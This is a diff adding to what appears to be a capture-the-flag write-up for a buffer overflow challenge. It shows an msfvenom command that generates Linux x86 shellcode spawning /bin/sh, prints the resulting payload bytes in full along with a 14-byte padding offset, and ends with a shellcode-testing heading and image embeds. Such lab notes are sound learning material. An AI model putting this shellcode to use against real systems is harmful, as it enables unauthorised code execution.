@@ -78,3 +78,30 @@ I will keep reducing it till i see 44434241 it is 14.
 So the final payload structure is \x55 * 14
 
 # Prepare Shellcode
+
+
+https://medium.com/@kisalnelaka6/demystifying-shellcode-generation-a-guide-for-beginners-e8b536599296
+
+[hacker22@warhead chal6]$ msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x31' -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No badchars present in payload, skipping automatic encoding
+No encoder specified, outputting raw payload
+Payload size: 43 bytes
+Final size of python file: 227 bytes
+buf =  b""
+buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
+buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
+buf += b"\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
+buf += b"\x00\x57\x53\x89\xe1\xcd\x80"
+[hacker22@warhead chal6]$
+
+\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80
+
+
+## Testing the shellcode 
+
+
+![[Pasted image 20260701162126.png]]
+
+![[Pasted image 20260701162158.png]]
